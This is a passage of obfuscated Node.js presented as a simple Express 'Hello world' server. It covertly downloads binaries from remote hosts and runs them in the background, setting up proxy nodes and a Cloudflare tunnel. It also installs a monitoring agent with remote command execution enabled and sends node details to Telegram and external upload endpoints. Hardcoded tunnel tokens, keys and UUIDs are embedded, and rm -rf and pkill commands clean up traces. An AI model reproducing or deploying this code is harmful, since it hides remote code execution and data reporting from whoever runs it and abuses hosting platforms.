_0x1ab1d5=['vmess','openai','PORT','SUIDAO_PORT','web\x20is\x20running','app.html','express','56rFXvXs','\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0aPublicKey:\x20','https://arm64.ssss.nyc.mn/agent','length','stream','engage.cloudflareclient.com','fileUrl','config.json','\x20failed:\x20','```','rm\x20-rf\x20','1821382vvKmlP','BOT_TOKEN','TUIC_PORT','2087','dotenv','openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22private.key\x22\x20-out\x20\x22cert.pem\x22\x20-subj\x20\x22/CN=bing.com\x22','bot\x20is\x20running.','rule_set','binary','2606:4700:110:851f:4da3:4e2c:cdbf:2ecf/128','stringify','\x0a\x20\x20credentials-file:\x20','1570790wjqyid','trim','youtube','\x20-p\x20','Sec-WebSocket-Protocol','filter','get','has','Failed\x20to\x20extract\x20privateKey\x20or\x20publicKey\x20from\x20output.','2096','vmess://','8.8.8.8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20>/dev/null\x202>&1','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','arm','sendFile','200','server\x20is\x20running\x20on\x20port:','outbound','Failed\x20to\x20send\x20Telegram\x20message','post','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','string','YOUNGHERO\x20variable\x20is\x20empty,\x20skipping\x20running','Public\x20Key:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','SUIDAO_AUTH','unlink','push','config','route','private.key','\x20generate\x20reality-keypair','local','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','rules','web','tuic','https://amd64.ssss.nyc.mn/v1','sub.txt','data','./.npm','netflix','fileName','CHAT_ID','test','readFileSync','set','384454rzDImn','Private\x20Key:','utf8','/api/add-subscriptions','https://arm64.ssss.nyc.mn/v1','then','pipe','HY2_PORT','SUB_PATH','boot.log','cert.pem','YouTube\x20check\x20error:','direct','\x20already\x20exists','6MXHjYb','Error\x20generating\x20reality-keypair:\x20','172.16.0.2/32','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiOWM5MDU1YmYtODJkNy00NWM0LWI0ZjAtZmY0Y2JiNjBmM2ZiIiwicyI6Ik5qSXdPRGd6WlRZdE4yVTJOaTAwWVdWa0xXSmlOamt0Tm1ReE5qRXlORFk1TkRreCJ9','22d73127-cc6a-4163-8081-2cafd693828c','base64','8443','message','npm','hysteria2','253992KvPLnm','npm\x20is\x20running','bot','/sub.txt\x20saved\x20successfully','?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#','env','Download\x20','添加URL失败:\x20','close','amd','hysteria-in','Error\x20executing\x20command:\x20','35561','nzag.faiz.us.kg:8008','wireguard-out','\x20run\x20-c\x20','/vmess-suidao','finish','Subscription\x20uploaded\x20successfully','child_process','REALITY_PORT','send','includes','SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','match','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=chrome&pbk=','openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22private.key\x22','PrivateKey\x20or\x20PublicKey\x20is\x20missing,\x20retrying...','18365922niRXGo','https://amd64.ssss.nyc.mn/sb','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','output','automatic\x20access\x20task\x20added\x20successfully','SuidaoDomain:','vmess-ws-in','map','\x20-s\x20','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs','tuic-in','nohup\x20','Error\x20reading\x20boot.log:','php\x20running\x20error:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','aarch64','tunnel.yml','web\x20running\x20error:\x20','existsSync','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs','YOUNGHERO_PORT','key.txt','./npm','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/php\x20-c\x20\x22','response','join','Failed\x20to\x20get\x20IP\x20address:','axios','arch','split','Hello\x20world!','/vmess-suidao?ed=2048','TunnelSecret','tls','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','35562','&type=tcp&headerType=none#','none','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','--tls','curl\x20-o\x20/dev/null\x20-m\x202\x20-s\x20-w\x20\x22%{http_code}\x22\x20https://www.youtube.com','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs','/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#','toString','bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','false','npm\x20running\x20error:\x20','Telegram\x20message\x20sent\x20successfully','https://bing.com','8762384DjtZZS','\x5c$&','./bot','2053','from','createWriteStream','replace','\x20>/dev/null\x202>&1\x20&','MarkdownV2','SUIDAO_DOMAIN','2083','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','App\x20is\x20running','text/plain;\x20charset=utf-8','CFPORT','10fTjyaR','SUIDAO_DOMAIN:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','vless-in','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','unshift','443','remote','316840PxawhN','utf-8','FILE_PATH','list.txt','UPLOAD_URL','YOUNGHERO_SERVER','catch','Error\x20generating\x20private.key:\x20','\x20is\x20created','35560','inbounds','PrivateKey:\x20','pop','path','config.yaml','tunnel.json','application/json','./web','status','节点推送通知**\x0a```','bot\x20is\x20running','forEach','tag','error','log','mkdirSync','https://arm64.ssss.nyc.mn/sb','bbr','https://api.telegram.org/bot','writeFileSync','Empowerment\x20failed\x20for\x20','php','PROJECT_URL','Skipping\x20adding\x20automatic\x20access\x20task','xtls-rprx-vision','rpip.kaixa.v6.navy','all','clear','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Failed\x20to\x20extract\x20privateKey\x20or\x20publicKey\x20from\x20key.txt.'];_0x3fcd=function(){return _0x1ab1d5;};return _0x3fcd();}async function sendTelegram(){const _0x132683=_0xf0fbb6;if(!BOT_TOKEN||!CHAT_ID){console[_0x132683(0xe5)]('TG\x20variables\x20is\x20empty,Skipping\x20push\x20nodes\x20to\x20TG');return;}try{const _0x5acbe9=fs[_0x132683(0x143)](path['join'](FILE_PATH,_0x132683(0x13c)),_0x132683(0x147)),_0x56fe41=_0x132683(0xe9)+BOT_TOKEN+'/sendMessage',_0x3c2220=NAME[_0x132683(0xbc)](/[_*[\]()~`>#+=|{}.!-]/g,_0x132683(0xb7)),_0x21d817={'chat_id':CHAT_ID,'text':'**'+_0x3c2220+_0x132683(0xe0)+_0x5acbe9+_0x132683(0x106),'parse_mode':_0x132683(0xbe)};await axios[_0x132683(0x129)](_0x56fe41,null,{'params':_0x21d817}),console[_0x132683(0xe5)](_0x132683(0xb4));}catch(_0x40b1cc){console['error'](_0x132683(0x128),_0x40b1cc);}}async function uplodNodes(){const _0xb0ed8b=_0xf0fbb6;if(UPLOAD_URL&&PROJECT_URL){const _0x4d4817=PROJECT_URL+'/'+SUB_PATH,_0x492db1={'subscription':[_0x4d4817]};try{const _0x254021=await axios[_0xb0ed8b(0x129)](UPLOAD_URL+_0xb0ed8b(0x148),_0x492db1,{'headers':{'Content-Type':'application/json'}});if(_0x254021[_0xb0ed8b(0xdf)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x10066d){if(_0x10066d['response']){if(_0x10066d[_0xb0ed8b(0x9d)][_0xb0ed8b(0xdf)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xb0ed8b(0x96)](listPath))return;const _0x44c93c=fs[_0xb0ed8b(0x143)](listPath,_0xb0ed8b(0xce)),_0x4ae888=_0x44c93c['split']('\x0a')[_0xb0ed8b(0x119)](_0x299b18=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x299b18));if(_0x4ae888[_0xb0ed8b(0x100)]===0x0)return;const _0x4b46f2=JSON[_0xb0ed8b(0x112)]({'nodes':_0x4ae888});try{await axios[_0xb0ed8b(0x129)](UPLOAD_URL+'/api/add-nodes',_0x4b46f2,{'headers':{'Content-Type':_0xb0ed8b(0xdd)}});if(response[_0xb0ed8b(0xdf)]===0xc8)console['log'](_0xb0ed8b(0x16f));else return null;}catch(_0x4bc44a){return null;}}else return;}}async function AddVisitTask(){const _0x35494f=_0xf0fbb6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x35494f(0xe5)](_0x35494f(0xee));return;}try{const _0x489b52=await axios[_0x35494f(0x129)]('https://keep.gvrander.eu.org/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x35494f(0xdd)}});console[_0x35494f(0xe5)](_0x35494f(0x17d));}catch(_0x95e69){console[_0x35494f(0xe4)](_0x35494f(0x164)+_0x95e69[_0x35494f(0x15a)]);}}function _0x56f4(_0x4dee5e,_0x5e3225){const _0x3fcdfb=_0x3fcd();return _0x56f4=function(_0x56f499,_0x274d51){_0x56f499=_0x56f499-0x8c;let _0x3fe1d5=_0x3fcdfb[_0x56f499];return _0x3fe1d5;},_0x56f4(_0x4dee5e,_0x5e3225);}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),AddVisitTask(),cleanFiles();}startserver(),app['listen'](PORT,()=>console[_0xf0fbb6(0xe5)](_0xf0fbb6(0x126)+PORT+'!'));
